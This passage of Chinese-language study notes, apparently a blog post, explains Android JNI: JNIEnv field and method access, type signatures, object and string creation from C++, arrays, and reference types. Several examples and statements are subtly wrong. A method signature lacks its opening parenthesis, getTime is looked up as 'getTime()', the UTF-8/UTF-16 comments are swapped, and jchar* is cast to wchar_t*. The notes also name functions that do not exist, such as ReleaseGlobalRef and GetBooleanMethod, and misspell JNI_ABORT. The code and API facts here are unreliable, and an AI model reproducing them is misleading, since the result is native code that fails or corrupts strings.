&lt;li&gt;&lt;p&gt;Get&lt;Type&gt;Field: 获取型为Type的字段。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Set&lt;Type&gt;Fileld: 设置类型为Type的字段的值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;GetStatic&lt;Type&gt;Field: 获取类型为Type的static的字段。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SetStatic&lt;Type&gt;Field:设置类型为Typede的static的字段的值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Call&lt;type&gt;Method: 调用返回类型为Type的方法。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;CallStatic&lt;Type&gt;Method: 调用返回值类型为Type的Static方法&lt;/p&gt;

&lt;p&gt;&amp;hellip;..&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Jobject参数obj&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果native 方法不是static ,obj就代表native方法的实例。&lt;/p&gt;

&lt;p&gt;如果narive方法是static,obj 就代表native方法的类的class对象实例。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Java和C++中的基本类型的映射关系&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;具体查看jni.h文件的详细说明&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Java类型&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;本地类型&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;JNI定义的别名&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;int&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jint/jsize&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;_int64&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jlong&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;byte&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;signed char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jbyte&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;boolean&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;unsigned char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jboolean&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;unsigned short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jchar&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jshort&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jfloat&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jdouble&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Object&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;_jobject*&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jobject&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;jclass类型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;jclass 表示java中的class 类：&lt;/p&gt;

&lt;p&gt;JNIEnv 类中有如下几个简单的函数可以取得jclass:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;jclass FindClass( const char* clsName):通过类的名称来获取jclass&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jcalss GetObjectClass( jobject obj ):通过对象实例来获取jcalss,相当于java 中的getclass方法&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jclass GetSuperClass(jclass obj):通过jclass 可以获取其父类的jclass对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;native中访问Java层代码&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;常见的应用就是获取类的属性和调用类的方法&lt;/p&gt;

&lt;p&gt;JNi在jni.h头文件中定义了jfieldId、jmethodID类型分别代表JAVA端的属性和方法。&lt;/p&gt;

&lt;p&gt;使用JNI的以下方法来取得相应的jfieldId、jmethodID：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetFieldID、GetMethodID&lt;/li&gt;
&lt;li&gt;GetStaticFieldID、GetStaticMethodID&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;查看jni.h中源函数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt; GetFieldID(jclass clazz, const char* name, const char* sig)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​   参数说明：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;clazz 方法依赖的类对象的class对象&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;name: 字段的名称&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;sig : 字段的签名&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;查看签名命令&lt;/p&gt;

&lt;p&gt;&lt;code&gt;javap -s -p 字节码.class 文件&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;GetMethodID 也能够会的构造函数的jmethodID，创建一个Java对象是可以调用指定的构造方法，eg：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;env-&amp;gt;GetmethodID(data_class,&amp;quot;&amp;lt;init&amp;gt;&amp;quot;,&amp;quot;()v&amp;quot;);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;签名的格式：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;类型&lt;/th&gt;
&lt;th&gt;相应的签名&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;boolean&lt;/td&gt;
&lt;td&gt;Z&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;byte&lt;/td&gt;
&lt;td&gt;B&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;chat&lt;/td&gt;
&lt;td&gt;C&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;int&lt;/td&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td&gt;L&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td&gt;F&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td&gt;D&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;void&lt;/td&gt;
&lt;td&gt;V&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;object&lt;/td&gt;
&lt;td&gt;L用/分割包的完整类名；Ljava/lang/String;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Array&lt;/td&gt;
&lt;td&gt;[签名 [I [Ljava/lang/Object&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Method&lt;/td&gt;
&lt;td&gt;(参数类型签名··· .) 返回值类型签名&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;eg:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package com.naivete.jni_study;

import java.util.Date;

public class Hello {
    public int property;
    public int function(int foo, Date date,int[] arr){
        System.out.println(&amp;quot;function&amp;quot;);
        return 0;
    }

    public native void test();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;extern &amp;quot;C&amp;quot;
JNIEXPORT void JNICALL
Java_com_naivete_jni_1study_Hello_test(JNIEnv *env, jobject instance) {

    // TODO
    jclass helloclazz = env-&amp;gt;GetObjectClass(instance);
    jfieldID field_prop = env-&amp;gt;GetFieldID(helloclazz,&amp;quot;property&amp;quot;,&amp;quot;I&amp;quot;);   //取到property字段
    jmethodID method_fun = env-&amp;gt;GetMethodID(helloclazz,&amp;quot;function&amp;quot;,&amp;quot;ILjava/util/Date;[I)I&amp;quot;); //取到function函数
    env-&amp;gt;CallIntMethod(instance,method_fun,0L,NULL,NULL);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;GetStaticFieldID与GetStaticMethodID这两个方法的用法大同小异。&lt;/p&gt;

&lt;h4 id=&#34;2-3-jnienv类型中方法的使用&#34;&gt;2.3 JNIEnv类型中方法的使用&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;在java中定义一个属性，再从C++代码中将其设置成另外的值&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;2-3-1-native中获取方法的id&#34;&gt;2.3.1 native中获取方法的ID&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private static String TAG = &amp;quot;Hello&amp;quot;;
       public int number = 0;
       public native void sayHello();
   
       public static void main() {
           Hello hello = new Hello();
           hello.sayHello();
           System.out.print(hello.number);
           Log.d(TAG, &amp;quot;&amp;quot;+hello.number);
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   JNIEXPORT void JNICALL
   Java_com_naivete_jni_1study_Hello_sayHello(JNIEnv *env, jobject instance) {
   
       // TODO
       jclass helloclazz = env-&amp;gt;GetObjectClass(instance);
       jfieldID id_number = env-&amp;gt;GetFieldID(helloclazz,&amp;quot;number&amp;quot;,&amp;quot;I&amp;quot;); //获取numberID
       jint number = env-&amp;gt;GetIntField(instance,id_number); //获取number的值;
       cout&amp;lt;&amp;lt;number&amp;lt;&amp;lt;endl;  //输出到控制台
       env-&amp;gt;SetIntField(instance,id_number,100L); //设置number的值;注意jint对应c++ long类型
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-2-1.png&#34; alt=&#34;1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;JNIEnv 还提供了许多Call&lt;Type&gt;Method 和CallStatic&lt;Type&gt;Method 还有CallNovirtual&lt;Type&gt;Method函数，需要通过GetMethodID来取得相应的方法的jmethodId传入到上述函数的参数中&lt;/p&gt;

&lt;p&gt;调用示例方法的三种形式如下：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,·······);&lt;/code&gt; //常用的方式&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,va_list lst);&lt;/code&gt; //有指向参数表的va_list变量（很少使用）&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,jvalue * v);&lt;/code&gt; //有指向jvalue或jvalue数组指针时用的&lt;/p&gt;

&lt;p&gt;jvalue 是union联合体，定义jvalue数组传递到方法中，这样可以包含多种类型的参数：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;   typedef union jvalue{
       jboolean z;
       jbytpe   b;
       jchar    c;
       jshort   s;
       jint     i;
       jlong    j;
       jfloat   f;
       jdouble  d;
       jobject  l;
   }jvalue;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;比如在Java中有这样一个方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   boolean function(int a,double b,char c){
   
   ·····
   
   }
   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1）在C++中使用第一种方法调用function方法：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;env-&amp;gt;CallbooleanMethod(obj,id_function,10L，3.4，L&#39;a&#39;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;obj:functon对象，id_function:functiond的id,10L、3.4、L&amp;rsquo;a&amp;rsquo;是对应的参数。&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;a&amp;rsquo; 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。&lt;/p&gt;

&lt;p&gt;2）在C++中使用第三种方法function调用：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   jvalue* args = new Jvalue[3]
   args[0] = 10L;
   args[1] = 3.22;
   args[2] = L&#39;a&#39;;
   env-&amp;gt;GetBooleanMethod(obj,id_function,args);
   delete[] args;  //是否指针堆内存
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-3-2-java和c-中的多态机制&#34;&gt;2.3.2 Java和C++中的多态机制&lt;/h5&gt;

&lt;p&gt;JNIEnv中的特殊方法CallNovirtual&lt;type&gt;Method。来帮助java调用Java中父类的方法。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;介绍了-C++和java多态的基础知识。&lt;/li&gt;
&lt;li&gt;步骤：

&lt;ul&gt;
&lt;li&gt;获取obj中对象的class 对象 GetObjectClass(obj)&lt;/li&gt;
&lt;li&gt;获取java中father字段的id GetFieldID()&lt;/li&gt;
&lt;li&gt;获取father字段的对象类型 GetObjectField&lt;/li&gt;
&lt;li&gt;获取father对象的class对象 FindClass&lt;/li&gt;
&lt;li&gt;获取father对象中function方法ID GetMethodID()&lt;/li&gt;
&lt;li&gt;调用父类中的function方法（会执行子类的方法）CallvoidMethod&lt;/li&gt;
&lt;li&gt;调用父类中的function方法（会执行父类的方法）CallNonvirtualVoidMethod()&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;2-4-创建java对象及字符串的操作方法&#34;&gt;2.4 创建Java对象及字符串的操作方法&lt;/h4&gt;

&lt;h5 id=&#34;2-4-1-native中创建java对象&#34;&gt;2.4.1 native中创建Java对象&lt;/h5&gt;

&lt;p&gt;​   两种方法：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;第一种：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;jobject Newobject(jclass clazz,jmethodID methodID,·····)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;clazz 需要创建的Java对象的Class对象。&lt;/li&gt;
&lt;li&gt;methodID :传递一个方法的ID: 构造方法&lt;/li&gt;
&lt;li&gt;第三个参数：构造函数需要传入的参数值（默认不传递） 默认构造方法返回值签名始终是&amp;rdquo;()V&amp;rdquo;,方法的名称始终是&amp;rdquo;&lt;init&gt;&amp;ldquo;。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在C++中构造Java中的Date对象调用方法getTime():&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   jclass clazz_date = env-&amp;gt;FindClass(&amp;quot;java/util/Date&amp;quot;); //获取date对象
   jmethodID mid_date = env-&amp;gt;GetMethodID(clazz_date,&amp;quot;&amp;lt;init&amp;gt;&amp;quot;,&amp;quot;()V&amp;quot;); //获取构造方法的ID
   jobject now = env-&amp;gt;NewObject(clazz_date,mid_date); //生成Date对象
   jmethodID mid_date_getTime = env-&amp;gt;GetMethodID(clazz_date,&amp;quot;getTime()&amp;quot;,&amp;quot;()J&amp;quot;); //获取getTime的ID
   jlong time = env-&amp;gt;CallLongMethod(now,mid_date_getTime);//调用getTime返回时间
   printf(&amp;quot;%I64d&amp;quot;,time);
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;第二种：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用AllocObject函数创建一个对象，可以根据传入的jclass创建一个java对象，但是状态时未初始化的，在这个对象之前绝对要用CallNonvirtualVoidMethod来调用该jclass的构造函数这样可以延迟构造函数的调用。用的比较少。&lt;/p&gt;

&lt;p&gt;eg：略；&lt;/p&gt;

&lt;h5 id=&#34;2-4-2-native中操作java字符串&#34;&gt;2.4.2 native中操作Java字符串&lt;/h5&gt;

&lt;p&gt;​   Java-String对象是Unicode(UTF-16)码 一个字符总是占用两个字节 可以通过JNI接口将Java中的字符串转换到C++的宽字符串（wchar_t*),或者传回一个UTF-8编码的字符串（char * )到C++ 反过来同理。&lt;/p&gt;

&lt;p&gt;JNIEnv中的一些C++方法：&lt;/p&gt;

&lt;p&gt;1）获取字符串的长度：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;jsize GetStringLength(jstring j_msg)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;1) 将jstring 对象拷贝到const jchar* 指针字符串：&lt;/p&gt;

&lt;p&gt;​   //拷贝Java字符串并以UTF-8编码传入jstr:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;env-&amp;gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   ////拷贝Java字符串并以UTF-16编码传入jstr:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;env-&amp;gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3) 生成一个jstring 对象&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;jobject NewString(const jchar* jstr,int size);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   将字符串指针jstr转换成jstring。&lt;/p&gt;

&lt;p&gt;4) 将jstring对象转换成const jchar* 字符串指。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetStringChars 开内存 指针指向先开的内存&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;const* jchar * GetStringChars(jstring j_msg,jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;返回一个UTF-16编码的宽字符串（jchar*);&lt;/p&gt;

&lt;p&gt;对应的释放内存方法：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ReleaseStringChars(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetStringUTFChars 不开内存直接指向Java中string的指针&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;const char* GetStringUTFChars(jstring str,jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;取得UTF-8编码的字符串&lt;/p&gt;

&lt;p&gt;释放：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ReleaseStringUTFChars(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;5) 将jstring 对象转化成const jchar* 字符串指针：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   作用:增加直接传回指向Java字符串的指针的可能性（而不是拷贝）；&lt;/p&gt;

&lt;p&gt;​   在&lt;code&gt;GetStringCritical/ReleaseStringCritical&lt;/code&gt;之间的关键区域之间不能调用任何其他JNI函数。否则会造成关键区域代码执行期间垃圾回收器停止工作。任何触发垃圾回收器的的线程也将暂停。&lt;/p&gt;

&lt;p&gt;​   释放：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;ReleaseStringCritical(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;实例eg：（与书上不同,思路大概相同）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class MainActivity extends AppCompatActivity {
    private EditText et;
    private TextView tv;
    private Button bt;
    public String text = null;

    // Used to load the &#39;native-lib&#39; library on application startup.
    static {
        System.loadLibrary(&amp;quot;native-lib&amp;quot;);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        et = findViewById(R.id.editText);
        tv = findViewById(R.id.tv);
        bt = findViewById(R.id.button);
        bt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                text = et.getText().toString().trim();
                callCppFunction();
                tv.setText(text);
            }
        });

    }

    public native void callCppFunction();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;#include &amp;lt;jni.h&amp;gt;
#include &amp;lt;string&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include&amp;lt;algorithm&amp;gt;
using namespace std;

extern &amp;quot;C&amp;quot;
JNIEXPORT void JNICALL
Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv *env, jobject instance) {

    // TODO
    //获取text
    jfieldID  fid_tx = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(instance),&amp;quot;text&amp;quot;,&amp;quot;Ljava/lang/String;&amp;quot;);
    //获取ext对象
    jstring j_tx = (jstring)env-&amp;gt;GetObjectField(instance,fid_tx);
    //第一种方式
    //获得字符串指针：
    const jchar* jstr1 = env-&amp;gt;GetStringChars(j_tx,NULL);
    //z转换成宽字符
    wstring wstr((const wchar_t*)jstr1);
    //释放指针
    env-&amp;gt;ReleaseStringChars(j_tx,jstr1);
    //第一种END

    //第二种
    const jchar * jstr2 = env-&amp;gt;GetStringCritical(j_tx,NULL);
    wstring wstr2((const wchar_t*)jstr2);
    env-&amp;gt;ReleaseStringCritical(j_tx,jstr2);
    //END

    //第三种
    jsize len = env-&amp;gt;GetStringLength(j_tx);  //获取长度
    jchar * jstr3 = new jchar[len+1];
    jstr3[len]=L&#39;\0&#39;;
    //复制
    env-&amp;gt;GetStringRegion(j_tx,0,len,jstr3);
    wstring wstr3((const wchar_t*)jstr3);
    delete[] jstr3;
    //End

    //倒序
    reverse(wstr.begin(),wstr.end());
    jstring j_new_str = env-&amp;gt;NewString((const jchar*)wstr.c_str(),(jint)wstr.size());
    env-&amp;gt;SetObjectField(instance,fid_tx,j_new_str);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-2-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h4 id=&#34;2-5-c-c-中操作java中的数组&#34;&gt;2.5 C/C++中操作Java中的数组&lt;/h4&gt;

&lt;p&gt;​   在java中数组分为两种：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;基本类型数组&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;对象类型数组&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个能用于两种不同类型数组的函数是：GetArrayLength(jarray array)。&lt;/p&gt;

&lt;h5 id=&#34;2-5-1-操作基本类型的数组&#34;&gt;2.5.1 操作基本类型的数组&lt;/h5&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Get&lt;Type&gt;ArrayElements方法&lt;br /&gt;
&lt;code&gt;Get&amp;lt;Type&amp;gt;ArrayElements(&amp;lt;Type&amp;gt;Array arr,jboolean* isCopide)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;把Java中的基本类型的数组转换成C++中的数组 两种方式：&lt;/p&gt;

&lt;p&gt;一是拷贝一份传回本地，另外一种是把指向Java数组的指针直接传回到本地代码中&lt;/p&gt;

&lt;p&gt;处理完后，通过Release&lt;Type&gt;Arrayelements 来释放数组。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Release&lt;Type&gt;Arrayelement 方法&lt;br /&gt;
&lt;code&gt;Release&amp;lt;Type&amp;gt;Arrayelement(Type&amp;gt;Array arr,&amp;lt;Type&amp;gt;* array,jint mode)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个函数可以选择如何处理Java和C++中的数组，是提交还是撤销····内存是否释放等等。&lt;/p&gt;

&lt;p&gt;mode的取值：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;0：对Java的数组进行更新并且释放C/C++数组&lt;/li&gt;
&lt;li&gt;JNI_COMMIT：更新但是不释放&lt;/li&gt;
&lt;li&gt;JNI_ABOUT：不更新，释放。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;GetPrimittiveArrayCritical方法&lt;br /&gt;
&lt;code&gt;GetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ReleasePrimittiveArrayCritical方法&lt;br /&gt;
&lt;code&gt;ReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Get&lt;type&gt;ArrayRegion方法&lt;br /&gt;
&lt;code&gt;Get&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,&amp;lt;Type&amp;gt;* buffer)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在C++中开辟内存，拷贝数组到内存中。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Set&lt;type&gt;ArrayRegion&lt;br /&gt;
&lt;code&gt;Set&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,const &amp;lt;Type&amp;gt;* buffer)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;把Java基本类型数组中的指定范围的元素用C++数组中的元素来赋值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;Type&gt;ArrayNew方法&lt;br /&gt;
&lt;code&gt;&amp;lt;Type&amp;gt;ArrayNew&amp;lt;Type&amp;gt;Array(jszie sz)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;指定一个长度然后返回相应的Java基本类型的数组。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&#34;2-5-2-操作对象数组类型&#34;&gt;2.5.2 操作对象数组类型&lt;/h5&gt;

&lt;p&gt;​   JNI未提供把Java对象数组 直接转到C++对象数组的函数。而是通过&lt;code&gt;Get/SetObjectArrayaElement&lt;/code&gt;这样的函数来对java中的对象数组进行操作。因为未拷贝 所以没有释放操作。&lt;code&gt;NewObjectArray&lt;/code&gt;可以通过指定长度和初始值来创建某一个类的数组。&lt;/p&gt;

&lt;p&gt;例子：两种类型的操作：&lt;/p&gt;

&lt;p&gt;略·····&lt;/p&gt;

&lt;p&gt;​   注：书本P34-36&lt;/p&gt;

&lt;h4 id=&#34;2-6-c-c中的引用类型和id缓存&#34;&gt;2.6 C++/C中的引用类型和ID缓存&lt;/h4&gt;

&lt;h5 id=&#34;2-6-1-引用类型&#34;&gt;2.6.1 引用类型&lt;/h5&gt;

&lt;p&gt;​   从Java创建对象传到本地C/C++代码时会产生引用，根据Java的垃圾回收机制，只要存在引用就不会触发改引用所指的Java对象垃圾回收。&lt;/p&gt;

&lt;p&gt;​   几种C/C++中的引用类型：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;局部引用：（最常见）&lt;/p&gt;

&lt;p&gt;局部引用只在该native函数中有用，所有在该函数中产生的局部引用，都会在函数返回时自动释放，也可以使用DeleteLocalRef函数手动释放。&lt;/p&gt;

&lt;p&gt;有效期中能传递到别的本地函数中，千万不要用C++全局变量保存它，或者把它定义为C++静态局部变量。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;全局引用：&lt;/p&gt;

&lt;p&gt;可以跨越当前线程，在对个native函数中有效，需要手动释放。会阻止垃圾回收器回收这个引用所指的对象。&lt;/p&gt;

&lt;p&gt;不同于局部引用，全局引用的创建不是由JNI自动创建的，全局引用是需要调用NewGlobalRef函数，释放使用ReleaseGlobalRef函数。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;弱全局引用&lt;/p&gt;

&lt;p&gt;与全局引用相似。不一样的为不会阻止垃圾回收器回收这个引用所指对象，使用NewWeakGlobalRef和ReleaseWeakGlobalRef来产生和释放。&lt;/p&gt;

&lt;p&gt;关于引用的一些函数：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jobject NewGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

